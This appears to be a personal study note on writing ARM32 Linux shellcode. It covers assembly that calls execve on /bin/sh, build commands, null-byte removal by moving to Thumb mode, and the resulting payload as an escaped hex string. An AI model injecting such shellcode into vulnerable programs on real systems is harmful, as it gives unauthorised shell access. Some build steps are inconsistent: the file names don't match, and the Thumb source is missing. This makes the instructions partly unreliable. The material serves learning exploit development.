# ARM shellcode for launching a shell
##### arm32 asm
https://github.com/azeria-labs/ARM-assembly-examples/

`int  execve(const char *filename, char *const argv [], char *const envp[]);`

```
.section .text
.global _start

_start:
        add r0, pc, #12     @r0 = pc + 12 ("/bin/sh\0")
        mov r1, #0          @pass NULL into the argv[]
        mov r2, #0          @pass NULL into the envp[]
        mov r7, #11         @11 is syscall number of execve on linux arm
        svc #0

.ascii "/bin/sh\0"
```
# Banana skin
Why `pc + 12`?  Effective PC starts two instructions ahead of the current one. Great details here: https://azeria-labs.com/arm-data-types-and-registers-part-2/

##### Compile for arm32 on arm32 host
```
arm-linux-gnueabi-as -c execve.s -o execve.o && arm-linux-gnueabi-ld tiny.o -o tiny
```
##### Runtime
```
$ ./tiny
$ exit              <-- new shell
user@arm64:~$       <-- original shell
```
##### Remove Null bytes
```
$ objdump -d tiny.o
```
Move shellcode to `thumb` mode.

```
14:	6e69622f 	.word	0x6e69622f
18:	0068732f 	.word	0x0068732f
```
What is the final **00**?

If you convert the swap the byte order (`arm` defaults to `little endian`) you can decode..
```
14:	6e69622f 	.word	0x6e69622f    // /bin
18:	0068732f 	.word	0x0068732f    // /sh\0

```
This requires a new linker flag to work.

`arm-linux-gnueabi-as tiny.s -o tiny.o && arm-linux-gnueabi-ld -N tiny.o -o tiny`

##### Change to hex string
```
$ objcopy -O binary tiny tiny.bin       
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' tiny.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
```
##### References
```
https://azeria-labs.com/writing-arm-shellcode/
http://www.kernel-panic.it/security/shellcode/shellcode5.html
http://shell-storm.org/blog/Shellcode-On-ARM-Architecture/
https://modexp.wordpress.com/2017/01/21/shellcode-osx/
```
